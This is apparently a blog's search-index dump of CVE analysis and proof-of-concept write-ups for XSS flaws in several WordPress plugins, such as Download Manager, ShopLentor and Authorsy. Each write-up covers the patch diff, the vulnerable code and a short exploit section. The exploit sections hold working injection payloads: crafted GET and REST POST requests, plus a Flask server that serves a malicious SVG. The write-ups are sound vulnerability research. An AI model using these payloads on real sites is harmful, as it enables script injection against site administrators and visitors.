[{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"A vulnerability exists in the Download Manager plugin prior to version 3.3.24. Data retrieved from GET requests is printed directly into HTML attributes, leading to reflected XSS when a user with privileges accesses a URL crafted by an attacker. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Download Manager: v3.3.23(vulnerable) and v3.3.24(fixed) diff tool: meld or any tool capable of comparing differences between two versions ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Analysis ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in src/Admin/views/stats/history.php. Vulnerable code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e The GET parameters are directly assigned to the \u003ca\u003e element‚Äôs href without any protection, creating a risk of reflected XSS. Patched code: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL The patch sanitizes the GET parameters using sanitize_array and uses esc_url to escape the URL, making it safe. ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"How It Works We need to identify the real URL to inject GET parameters containing the XSS payload. src/Admin/views/stats/history.php contains PHP and HTML tags inside the views folder, indicating it is included somewhere in the plugin. Searching for history.php in the plugin directory: Search results for history.php üëâ No direct matches are found. It is likely included dynamically like {$file_name}.php. Using regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php is included in src/Admin/views/stats.php. The actual URL to access is declared at the top of stats.php: $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Similarly, stats.php is also included elsewhere, but it‚Äôs not necessary to trace further since the URL is identified. To verify, we set a breakpoint in src/Admin/views/stats/history.php, start debugging, and access the URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params First, the plugin collects all GET parameters into $get_params. If $user_ids is not empty, a ‚ÄúClear filter‚Äù button is created. To make the button functional, it must generate a URL without the user_ids parameter: $get_params_xu = $get_params; // copy all GET parameters unset($get_params_xu['user_ids']); // remove user_ids from array $reset_url = add_query_arg($get_params_xu, 'edit.php'); // generate new URL unset($get_params_xu['user_ids']) removes the filter. add_query_arg($get_params_xu, 'edit.php') generates the URL with remaining parameters. This URL is attached to the ‚ÄúClear filter‚Äù button: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Result: Clicking the button reloads the page without the user_ids filter. ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Detect XSS Send a GET request containing the XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 The \"\u003e\u003c/a\u003e closes the \u003ca\u003e tag, followed by a \u003cscript\u003e to trigger alert(). Reflected XSS triggered via GET parameter üëâ XSS succeeds. When a user with privileges accesses the attacker-provided URL, reflected XSS occurs, simulating an Unauthenticated attack scenario. ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Conclusion The vulnerability CVE-2025-10146 in WordPress Download Manager \u003c= 3.3.23 is a reflected XSS, occurring when GET request data is printed directly into an HTML attribute without sanitization or escaping. Privileged users accessing the attacker-crafted URL may be exploited. The patch in 3.3.24: Sanitizes GET parameters (sanitize_array) to remove dangerous characters. Escapes URL (esc_url) before rendering in HTML to prevent XSS. Key takeaways: Always sanitize and escape user input before rendering in HTML. Check user permissions before processing or displaying sensitive data. Low-privilege roles (like contributor) can become attack vectors if the plugin does not enforce proper protections. Updating plugins regularly is a simple and effective defense. ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"References Cross-site scripting (XSS) cheat sheet WordPress Download Manager Plugin \u003c= 3.3.24 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-06","objectID":"/2025-10-06-cve-2025-10146/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":" A vulnerability in the ShopLentor plugin prior to version 3.2.0 allows an attacker with contributor privileges to inject malicious code into a block‚Äôs CSS. This CSS is then loaded inline into the page and can lead to Stored XSS when previewed or rendered in a browser. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging ShopLentor: v3.2.0 (vulnerable) and v3.2.1 (fixed) diff tool: meld or any tool capable of comparing the two versions to see differences Activated WooCommerce plugin: WooCommerce must be activated before installing the ShopLentor Plugin ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Analysis ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare differences between the vulnerable and fixed versions. The notable difference is in the file woolentor-blocks/includes/classes/Manage_Styles.php. Vulnerable version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // No user permission check // No sanitization of CSS before saving update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Fixed version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Only admin or the post author are allowed $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Sanitize data before saving $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } The patch uses current_user_can('manage_options') to check for admin privileges: If the user is admin =\u003e the first part ! current_user_can('manage_options') = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. If the user is the author =\u003e the latter part get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. Patch Diff ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"How It Works public function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } The save_block_css() function in the Manage_Styles class is responsible for saving or deleting the block CSS. The application retrieves post_id and block_css from the request. Special case: if post_id == 'woolentor-widget' =\u003e the CSS is saved to wp_options. Normal post case: If there is a block (has_block = true): Mark the post as active (_woolentor_active). Save the CSS into the wp_postmeta table with meta_key = _woolentor_css. mysql\u003e select * from wp_postmeta where meta_key='_woolentor_css'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Write the CSS file into the uploads directory (woolentor-css-{post_id}.css). Write CSS If there is no block (has_block = false): Remove the active flag and CSS meta. Delete the CSS file if it exists. üëâ The likely attack scenario is a typical Stored XSS: a user with role contributor (who cannot publish) creates a post and injects an XSS payload into the block CSS. The payload is stored in the database or a file; a higher-privileged user previews the content before publishing, the payload is loaded/rendered in the browser and executes, causing XSS. To understand how the data is rendered, search the plugin for _woolentor_css. Since CSS is stored in wp_postmeta under the meta_key = _woolentor_css, the plugin will query this value and insert it directly into HTML. Search Meta Key generate_inline_css() fetches block CSS from wp_postmeta with meta_key = _woolentor_css and from the file woolentor-css-{$post_id}.css ‚Äî if the file exists it calls get_contents and inlines the CSS for the post with the given $post_id; otherwise it falls back to wp_postmeta. The content is placed inside a \u003cstyle type=\"text/css\"\u003e\u003c/style\u003e tag. The Manage_Styles class registers a REST API route in the register_routes function: public function register_routes( $namespace ){ register_rest_route( $namespace, 'save_css', [ [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'save_block_css' ], 'permission_callback' =\u003e [ $this, 'permission_check' ], 'args' =\u003e [] ] ] ); // other route } register_rest_route() creates a REST API endpoint at: /wp-json/{namespace}/save_css When a POST request is made to this endpoint: Word","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Detect XSS Use a user with the contributor role to create any post and note its ID. Send a POST request to http://localhost/wp-json/woolentor/v1/save_css with an XSS payload: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Response { \"code\":\"rest_forbidden\", \"message\":\"Sorry, you are not allowed to do that.\", \"data\":{ \"status\":401 } } üëâ The X-WP-Nonce header is missing for user authorization. Open the page source (Ctrl+U) of the post edit page: view-source:http://localhost/wp-admin/post.php?post=\u003cpost_id\u003e\u0026action=edit Search for wpApiSettings in the source and extract the nonce value. wpApiSettings Send the request including the X-WP-Nonce header with the obtained value: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Preview post Preview üëâ XSS succeeds. Inspect to see how the code was modified. View source code Code ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-58990 vulnerability in ShopLentor \u003c= 3.2.0 allows a contributor to inject malicious CSS leading to Stored XSS when an admin/author previews or views the post. The 3.2.1 patch adds permission checks and CSS sanitization to prevent exploitation. Key takeaways: Always combine permission checks and input sanitization when handling user-submitted data. Low-privilege roles (like contributor) can still be an attack vector if APIs are not properly protected. Stored XSS in WordPress commonly occurs when data saved to DB/files is rendered inline without sanitization. Timely plugin updates are a simple and effective mitigation. ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"References Cross-site scripting (XSS) cheat sheet WordPress ShopLentor Plugin \u003c= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-05","objectID":"/2025-10-05-cve-2025-58990/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":" The vulnerability exists in the Authorsy plugin for WordPress prior to version 1.0.6. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Although the description requires Subscriber privileges, it can actually be exploited Unauthenticated. ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Authorsy: v1.0.5 (vulnerable) and v1.0.6 (patched) Diff tool: meld or any tool to compare two versions ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Analysis The plugin allows custom CSS, stores it in wp_options, and injects it directly into the \u003cstyle\u003e tag on pages. However, users can interact with the API to modify CSS without proper access control, leading to Broken Access Control and potential XSS if malicious payloads are inserted. ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use a diff tool to compare vulnerable and patched versions. Notice clear differences in two files: core/settings/api-settings.php and core/enqueue-inline/enqueue-inline.php. File core/enqueue-inline/enqueue-inline.php public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } User data is inserted without validation, leaving it vulnerable to XSS. Patched version: public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single() \u0026\u0026 !empty($ea_custom_css)){ // Sanitize and escape to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } Sanitization ensures only safe CSS is injected. Diff showing changes in enqueue-inline.php to sanitize custom CSS File core/settings/api-settings.php Vulnerable: 'permission_callback' =\u003e function () { return true; }, Patched: 'permission_callback' =\u003e function () { return current_user_can('manage_options'); }, The permission callback now restricts access to admins, mitigating Broken Access Control and indirectly reducing XSS risk. Diff showing REST API permission callback changes in api-settings.php ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"How it works custom_inline_css() is hooked to wp_head. When WordPress renders the \u003chead\u003e section, this function concatenates user options from authorsy_get_option() into $custom_css and adds it inline: $custom_css = authorsy_get_option('ea_custom_css'); Since this data is stored in the database, this is Stored XSS. ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Exploit Send a POST request to /wp-json/authorsy/v1/settings with an XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } The payload closes the existing \u003cstyle\u003e and injects a \u003cscript\u003e tag. Visiting any page will execute the XSS. Injected XSS payload in via custom CSS \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:2:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-27006 vulnerability in Authorsy \u003c= 1.0.5 demonstrates Broken Access Control combined with XSS. Root causes: REST API lacks proper access control (permission_callback always true). Custom CSS is inserted without sanitization, enabling injection of \u003cscript\u003e tags. Nonce verification does not stop execution when invalid, making security checks ineffective. Key takeaways: Always use proper permission_callback to prevent Broken Access Control. Sanitize and escape user input before rendering in HTML/CSS/JS to prevent XSS. ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"References Cross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/2025-10-04-cve-2025-27006/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":" The vulnerability exists in the Assistant plugin for WordPress prior to version 3.6.2. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Assistant: v1.5.2 (vulnerable) and v1.5.3 (patched) Diff tool: meld or any tool capable of comparing two versions ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Analysis The application displays user-provided image content directly via a URL without validating or fully checking the MIME type. This allows an attacker to supply a file disguised as an image, which when processed by the browser, executes malicious code ‚Üí resulting in an XSS vulnerability. ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patch. Diff between vulnerable and patched version In this case, there are significant differences between the two versions. For easier tracking, the change log identifies where the XSS patch was applied: Changelog 1.5.3 (2025-09-08) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" üëâ The vulnerability is located in backend/src/Hooks/ImageProxy.php. Observing the differences between the two versions: Differences in the render_image function of ImageProxy.php The changes occur in the render_image function, which: Accepts a URL parameter from the query string ($_GET['url']). Sends a request from the server to that URL to fetch the content. Prevents SSRF using wp_safe_remote_get. If the content has a Content-Type header starting with image/, then: Sends the same Content-Type header back to the client. Echoes the file content to the browser. The browser displays the image not directly from the original source but through the WordPress server. SVG files also have a Content-Type starting with image/ and can contain embedded JavaScript ‚Üí XSS can occur. The patch added an additional check to verify the actual MIME type of the file to prevent XSS via SVG or maliciously disguised files. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() uses internal image processing (based on the binary data of the file) to determine the actual MIME type. If the result is not a valid image ‚Üí returns false. ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"How it works In the __construct of the ImageProxy class, the render_image() method is called via the 'init' action hook. The 'init' hook runs early in WordPress loading, after core objects are initialized but before output is sent to the browser. render_image is called only if the current user has permission to edit other users‚Äô posts and the $_GET['fl_asst_image_proxy'] parameter exists. üëâ Accessing /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path triggers render_image and returns the image content to the browser. ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Detect XSS Create a simple web page returning an SVG containing an XSS payload: from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Send a request with the url parameter pointing to https://yoursite/svg: http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg üëâ Successful for Unauthenticated because as long as the user has permission, accessing the URL triggers XSS in the victim‚Äôs browser. The attacker does not need to log in. SVG with XSS payload displayed via image proxy ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-53307 vulnerability in the WordPress Assistant plugin (\u003c= v1.5.2) allows XSS via render_image() because it does not validate the actual file MIME type. Version v1.5.3 patched this by verifying the file content before returning it to the browser. Key takeaways: Do not trust the Content-Type header from HTTP responses. Always validate the actual MIME type of the file. ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"References Cross-site scripting (XSS) cheat sheet WordPress Assistant Plugin \u003c= 1.5.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-03","objectID":"/2025-10-03-cve-2025-53307/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":" The vulnerability exists in the Hostel plugin for WordPress prior to version 1.1.5.8. An attacker could exploit it to target high-privilege users like admins. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7 (vulnerable) and v1.1.5.8 (patched) Diff tool: meld or any tool that can compare two versions ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analyst"],"content":"Analysis The root cause is the lack of sanitization and escaping for a parameter before rendering it on the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. ","date":"2025-10-02","objectID":"/2025-10-02-cve-2025-6234/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 